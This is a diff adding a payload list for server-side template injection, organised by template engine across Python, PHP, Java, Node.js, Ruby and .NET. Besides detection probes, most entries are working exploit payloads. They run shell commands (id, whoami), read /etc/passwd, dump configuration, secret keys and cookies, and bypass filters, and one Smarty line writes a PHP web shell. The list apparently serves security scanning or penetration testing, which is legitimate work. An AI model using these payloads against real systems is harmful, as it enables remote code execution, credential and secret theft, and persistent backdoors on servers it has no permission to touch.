@@ -1,0 +1,207 @@
+# Server-Side Template Injection (SSTI) Payloads
+# Tests for template engine vulnerabilities
+# Covers Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, etc.
+
+# Detection payloads (mathematical operations)
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@(7*7)
+{{7*'7'}}
+${7*'7'}
+[[${7*7}]]
+${T(java.lang.Runtime).getRuntime()}
+{{config}}
+{{self}}
+
+# Jinja2 (Python/Flask)
+{{config}}
+{{config.items()}}
+{{self.__class__.__mro__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__base__.__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{request.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[258]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
+{{request.environ}}
+{{request.args}}
+{{request.cookies}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+
+# Jinja2 - Filter bypass
+{{()|attr('\x5f\x5fclass\x5f\x5f')}}
+{{''|attr('__class__')|attr('__mro__')}}
+{%set x=''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()%}{{x}}
+{{''['__class__']['__mro__'][2]['__subclasses__']()}}
+{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][2]['\x5f\x5fsubclasses\x5f\x5f']()}}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['id']|map('system')|join}}
+{{app.request.server.all|join(',')}}
+{{dump(app)}}
+{{app.request.query.all()}}
+{{_self}}
+{{_context}}
+{{'whoami'|filter('exec')}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+{{include('/etc/passwd')}}
+
+# Smarty (PHP)
+{php}echo `id`;{/php}
+{php}system('whoami');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{$smarty.version}
+{$smarty.template}
+{system('id')}
+{passthru('id')}
+{exec('id')}
+
+# Freemarker (Java)
+${object.getClass()}
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+${.data_model.keySet()}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+
+# Velocity (Java)
+#set($x='')##
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# Pebble (Java)
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
+{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
+
+# Thymeleaf (Java)
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+
+# Mako (Python)
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+<% import os %>
+${os.popen('whoami').read()}
+<% import subprocess %>
+${subprocess.check_output('id',shell=True)}
+
+# Tornado (Python)
+{{eval("__import__('os').system('id')")}}
+{% import os %}{{os.popen('whoami').read()}}
+{{exec('import os;os.system("id")')}}
+
+# Django (Python) - Limited, mostly detection
+{% debug %}
+{{settings.SECRET_KEY}}
+{{request}}
+{{request.user}}
+{{request.META}}
+
+# Jade/Pug (Node.js)
+#{7*7}
+#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
+-var x = root.process
+-x = x.mainModule.require
+-x = x('child_process')
+=x.exec('id')
+
+# ERB (Ruby)
+<%= 7*7 %>
+<%= `id` %>
+<%= system('id') %>
+<%= IO.popen('id').read %>
+<%= File.read('/etc/passwd') %>
+<%= `whoami` %>
+<%= %x(id) %>
+
+# Slim (Ruby)
+= 7*7
+= `id`
+= system('id')
+
+# HAML (Ruby)
+= 7*7
+= `id`
+= system('id')
+
+# Liquid (Ruby)
+{{ 7 | times: 7 }}
+{% assign x = "/etc/passwd" | file %}
+
+# Mustache (varies)
+{{7*7}}
+{{#lambda}}{{/lambda}}
+
+# Handlebars (Node.js)
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+# EJS (Node.js)
+<%= 7*7 %>
+<%- 7*7 %>
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+
+# Nunjucks (Node.js)
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+{{constructor.constructor("return this.process.mainModule.require('child_process').execSync('id')")()}}
+
+# Underscore/Lodash (Node.js)
+<%= 7*7 %>
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+
+# ASP.NET Razor
+@(7*7)
+@{System.Diagnostics.Process.Start("cmd.exe", "/c whoami");}
+@(DateTime.Now)
+@Html.Raw("<script>alert(1)</script>")
+
+# Go Templates
+{{.}}
+{{ printf "%s" "test" }}
+{{html "test"}}
